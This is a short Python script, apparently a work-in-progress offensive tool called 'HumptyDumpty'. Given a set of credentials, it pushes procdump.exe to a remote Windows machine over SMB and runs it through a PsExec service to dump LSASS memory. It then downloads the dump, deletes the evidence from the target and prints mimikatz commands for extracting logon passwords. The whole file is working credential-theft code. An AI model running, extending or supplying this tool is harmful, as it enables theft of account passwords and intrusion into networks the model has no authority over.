#!/usr/bin/env python3
# Author: n33dle
# Description: Dumps LSASS on target machines and downloads the dumpfiles for some offline mimikatz. Not my idea, found this technique is quite popular, decided to make my own python tool
# WORK IN PROGRESS!
# Note: This code may suck.

import subprocess
import argparse
from termcolor import colored
from pypsexec.client import Client

parser = argparse.ArgumentParser(description="Dump lsass on remote machines for local processing!", 
    add_help=True,
    epilog="EXAMPLE: python3 humptydumpty.py -t 192.168.13.37 -u admin -p @dm1n")
parser.add_argument("--target", "-t", help="Set the target", dest="target")
parser.add_argument("--username", "-u", help="Set the target username", dest="username")
parser.add_argument("--password", "-p", help="Set the target password", dest="password")
parser.add_argument("--domain", "-d", help="Set the target domain", dest="domain", default="") #needs work
parser.add_argument("--output", "-o", help="Destination directory, default is current dir. Example: /dest/dir/", dest="output", default="")
parser.add_argument("--version", action="version", version="0.1")
args = parser.parse_args()

print (colored("\nHumptyDumpty by }==[n33dle]>----", "white"))

#upload procdump
print (colored("\n[-] Sending ProcDump over SMB...", "yellow"))
subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username+"%"+args.password,"-c put procdump.exe"])
print (colored("[+] Done", "green"))

#Dump creds
print (colored("[-] Dumping lsass to file (executing procdump)...", "yellow"))
c = Client(args.target, username=args.username, password=args.password, encrypt=False)
c.connect()
try:
 c.create_service()
 c.run_executable("cmd.exe","/c c:\procdump.exe -accepteula -64 -ma lsass.exe c:\humpty-" + args.target + ".dmp")
finally:
 c.disconnect()
print (colored("[+] Done", "green"))

#Download dump and cleanup
print (colored("[-] Downloading the lsass dumpfile and cleaning up...", "yellow"))
subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username+"%"+args.password,"-c get humpty-"+args.target+".dmp "+args.output+"humpty-"+args.target+".dmp;del humpty-"+args.target+".dmp;del procdump.exe"])

### FINISH ###
print (colored("[+] Done - saved as: "+args.output+"humpty-"+args.target+".dmp", "green"))

print (colored("[+] Complete! Now dump those creds\n\nRun the following:", "green"))
print (colored("\nMimikatz# sekurlsa::Minidump humpty-"+args.target+".dmp", "blue"))
print (colored("Mimikatz# sekurlsa::logonPasswords full", "blue"))

'''
To do:
- Set default as local auth and override with domain auth when -d selected
- Allow target to be single IP or list of IPs from a file
- Better error handling
- Automate mimikatz at the end, or prompt to run mimikatz or end script
This is a test
'''

